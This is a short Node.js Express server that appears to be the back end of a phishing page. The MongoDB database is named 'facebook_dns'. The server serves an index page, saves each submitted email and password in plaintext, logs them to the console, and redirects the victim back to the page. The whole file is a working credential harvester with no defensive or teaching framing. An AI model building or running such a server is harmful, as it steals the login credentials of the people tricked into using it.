var express = require('express')
var bodyParser = require('body-parser')
var mongoose = require('mongoose')
var schema = mongoose.Schema;
var ejs = require('ejs')
var fs = require('fs')
var app = express();

app.use(bodyParser.urlencoded({
    extended : true
}))



app.use(express.static('public'));

mongoose.connect("mongodb://localhost/facebook_dns", function(err){
    if(err){
        console.log("DB Error")
        throw err
    }
    else {
        console.log('DB Connect')
    }
})

var UserSchema = new schema({
    email : {
        type : String
    },
    pass : {
        type : String
    }
})

var User = mongoose.model('user', UserSchema)

app.listen(3000, function(err){
    if(err){
        console.log('Server Error!')
        throw err
    }
    else {
        console.log('Server Running At 80 Port!')
    }
})

app.get('/index', function(req, res){
    fs.readFile('index.html', 'utf-8', function(err, data){
        res.send(data)
    })
})

app.post('/index', function(req, res){
    var body = req.body;

    var user = new User({
        email : body.email,
        pass : body.pass
    })

    user.save(function(err, result){
        if(err){
            console.log('/index Error!')
            throw err
        }
        else {
            console.log("id="+body.email +"\n"+ "password="+ body.pass );
            res.redirect('/index');
        }
    })
})